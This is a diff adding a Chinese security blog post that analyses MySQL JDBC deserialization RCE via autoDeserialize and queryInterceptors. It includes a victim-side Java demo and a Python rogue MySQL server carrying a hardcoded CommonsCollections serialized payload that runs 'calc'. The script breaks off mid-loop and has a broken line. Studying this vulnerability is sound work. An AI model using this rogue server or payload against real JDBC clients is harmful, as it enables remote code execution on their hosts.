@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>mysql_jdbc_反序列化 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="mysql_jdbc_反序列化">
+  <meta property="og:description" content="MYSQL JDBC反序列化 JDBC简介 JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。
+简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。
+JDBC定义了一个叫java.sql.Driver的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。java.sql.DriverManager.getConnection(xxx)其实就是间接的调用了java.sql.Driver类的connect方法实现数据库连接的。数据库连接成功后会返回一个叫做java.sql.Connection的数据库连接对象，一切对数据库的查询操作都将依赖于这个Connection对象。
+一般的链接格式
+jdbc:driver://host:port/database?setting1=value1&amp;setting2=value2 漏洞原理 Mysql JDBC 中包含一个危险的扩展参数： “autoDeserialize”。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。
+若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE。
+JDBC连接参数 atementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。 queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&#34;之间&#34;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作） autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。 detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。 漏洞分析利用 demo搭建 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.19&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; 攥写demo代码，样例以ServerStatusDiffInterceptor作为触发点
+package org.example; import java.sql.Connection; import java.sql.DriverManager; public class APP { public static void main(String[] args) throws Exception { String ClassName = &#34;com.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-21T22:54:38+08:00">
+    <meta property="article:modified_time" content="2025-04-21T22:54:38+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="mysql_jdbc_反序列化">
+  <meta name="twitter:description" content="MYSQL JDBC反序列化 JDBC简介 JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。
+简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。
+JDBC定义了一个叫java.sql.Driver的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。java.sql.DriverManager.getConnection(xxx)其实就是间接的调用了java.sql.Driver类的connect方法实现数据库连接的。数据库连接成功后会返回一个叫做java.sql.Connection的数据库连接对象，一切对数据库的查询操作都将依赖于这个Connection对象。
+一般的链接格式
+jdbc:driver://host:port/database?setting1=value1&amp;setting2=value2 漏洞原理 Mysql JDBC 中包含一个危险的扩展参数： “autoDeserialize”。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。
+若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE。
+JDBC连接参数 atementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。 queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&#34;之间&#34;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作） autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。 detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。 漏洞分析利用 demo搭建 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.19&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; 攥写demo代码，样例以ServerStatusDiffInterceptor作为触发点
+package org.example; import java.sql.Connection; import java.sql.DriverManager; public class APP { public static void main(String[] args) throws Exception { String ClassName = &#34;com.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="prev" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "mysql_jdbc_反序列化",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+        },"genre": "posts","keywords": "java","wordcount":  536 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2025-04-21T22:54:38+08:00","dateModified": "2025-04-21T22:54:38+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">mysql_jdbc_反序列化</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-21">2025-04-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;536 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#jdbc简介">JDBC简介</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#jdbc连接参数">JDBC连接参数</a></li>
+    <li><a href="#漏洞分析利用">漏洞分析利用</a>
+      <ul>
+        <li><a href="#demo搭建">demo搭建</a></li>
+        <li><a href="#恶意mysql服务">恶意mysql服务</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="mysql-jdbc反序列化">MYSQL JDBC反序列化</h1>
+<h2 id="jdbc简介">JDBC简介</h2>
+<p>JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。</p>
+<p>简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。</p>
+<blockquote>
+<p>JDBC定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xxx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p>
+</blockquote>
+<p>一般的链接格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>jdbc:driver:<span style="color:#75715e">//host:port/database?setting1=value1&amp;setting2=value2</span>
+</span></span></code></pre></div><h2 id="漏洞原理">漏洞原理</h2>
+<p>Mysql JDBC 中包含一个危险的扩展参数： &ldquo;autoDeserialize&rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。</p>
+<p>若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。</p>
+<p>当JDBC连接到数据库时，驱动会自动执行<code>SHOW SESSION STATUS</code>和<code>SHOW COLLATION</code>查询，并对查询结果进行<strong>反序列化</strong>处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE。</p>
+<h2 id="jdbc连接参数">JDBC连接参数</h2>
+<ul>
+<li>atementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。</li>
+<li>queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&quot;之间&quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）</li>
+<li>autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。</li>
+<li>detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。</li>
+</ul>
+<h2 id="漏洞分析利用">漏洞分析利用</h2>
+<h3 id="demo搭建">demo搭建</h3>
+<p>pom.xml</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;groupId&gt;</span>mysql<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;artifactId&gt;</span>mysql-connector-java<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;version&gt;</span>8.0.19<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;groupId&gt;</span>commons-collections<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;artifactId&gt;</span>commons-collections<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;version&gt;</span>3.2.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>攥写demo代码，样例以<code>ServerStatusDiffInterceptor</code>作为触发点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.Connection;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.DriverManager;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">APP</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String ClassName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.mysql.jdbc.Driver&#34;</span>;
+</span></span><span style="display:flex;"><span>        String JDBC_Url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?&#34;</span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;autoDeserialize=true&#34;</span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span>;
+</span></span><span style="display:flex;"><span>        String username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
+</span></span><span style="display:flex;"><span>        String password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
+</span></span><span style="display:flex;"><span>        Class.<span style="color:#a6e22e">forName</span>(ClassName);
+</span></span><span style="display:flex;"><span>        Connection connection <span style="color:#f92672">=</span> DriverManager.<span style="color:#a6e22e">getConnection</span>(JDBC_Url, username, password);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="恶意mysql服务">恶意mysql服务</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>greeting_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span>
+</span></span><span style="display:flex;"><span>response_ok_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0700000200000002000000&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">receive_data</span>(conn):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Receiveing the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(data)<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(conn,data):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Sending the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(binascii<span style="color:#f92672">.</span>a2b_hex(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_payload_content</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &#34;calc&#34; &gt; payload </span>
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;payload&#39;</span><span style="color:#f92672">//</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            payload_content <span style="color:#f92672">=</span> str(binascii<span style="color:#f92672">.</span>b2a_hex(f<span style="color:#f92672">.</span>read()),encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;open successs&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;open false&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#calc</span>
+</span></span><span style="display:flex;"><span>        payload_content<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload_content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 主要逻辑</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        conn, addr <span style="color:#f92672">=</span> sk<span style="color:#f92672">.</span>accept()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Connection come from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(addr[<span style="color:#ae81ff">0</span>],addr[<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 1.先发送第一个 问候报文</span>
+</span></span><span style="display:flex;"><span>        send_data(conn,greeting_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
+</span></span><span style="display:flex;"><span>            receive_data(conn)
+</span></span><span style="display:flex;"><span>            send_data(conn,response_ok_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#其他过程</span>
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#查询一些配置信息,其中会发送自己的 版本号</span>
